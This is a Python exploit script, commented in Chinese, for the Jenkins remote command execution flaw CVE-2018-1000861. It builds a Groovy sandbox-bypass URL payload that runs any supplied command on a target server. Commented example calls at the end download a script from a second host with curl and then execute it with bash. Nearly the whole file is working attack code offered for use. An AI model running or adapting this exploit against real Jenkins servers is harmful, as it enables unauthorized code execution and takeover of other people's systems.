#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/18 17:21
# Author     : yunkong
# FileName   : cve_2018_1000861_cmd.py
# Description: 命令执行，无回显
#
# Exploit Title: Jenkins远程命令执行漏洞（CVE-2018-1000861）
# Version: Jenkins Version <=2.56; Jenkins LTS Version <= 2.46.1
# CVE: CVE-2018-1000861

import requests


def chack_cve_2018_1000861(target_url, command):
    # 构造payload连接
    payload = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy' \
              '.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"%s".execute()}}' % \
              command

    # 发送payload
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    }
    proxy = {
        "http": "127.0.0.1:8080",
        "https": "127.0.0.1:8080"
    }

    try:
        r = requests.request(url=target_url + payload,
                             method="GET",
                             proxies=proxy,
                             headers=headers)
        if r.status_code == 200:
            print('[+] Command executed successfully')
            return True
        else:
            print('[-] Failed to execute command')
            return False
    except:
        print('[-] Failed to execute command')
        return False


def vuln_scan_start(target_url, command):
    chack_cve_2018_1000861(target_url, command)

# vuln_scan_start("http://192.168.12.130:8080", "curl -o /tmp/bash.txt http://192.168.12.152:8080/bash.txt")
# vuln_scan_start("http://192.168.12.130:8080", "bash /tmp/bash.txt")
